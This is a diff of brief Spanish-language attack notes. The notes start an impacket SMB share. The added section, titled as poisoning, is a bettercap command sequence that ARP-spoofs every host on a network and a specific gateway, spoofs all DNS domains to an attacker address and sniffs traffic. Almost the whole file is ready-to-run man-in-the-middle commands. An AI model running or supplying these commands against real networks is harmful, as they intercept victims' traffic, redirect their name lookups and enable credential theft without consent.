@@ -1,4 +1,22 @@
 Crear smbfolder
 
 Levantar servicio
--> impacket-smbserver smbfolder $(pwd) -smb2support
+-> 
+impacket-smbserver smbfolder $(pwd) -smb2support
+###############################################################################
+Evenenamiento
+-> 
+net.probe on
+ticker on
+set arp.spoof targets *
+arp.spoof on
+set dns.spoof.domains *
+set dns.spoof.address 192.168.1.3
+dns.spoof on
+
+set arp.spoof targets 192.168.12.1
+arp.spoof on
+set net.sniff.verbose false
+net.sniff on
+###############################################################################
+
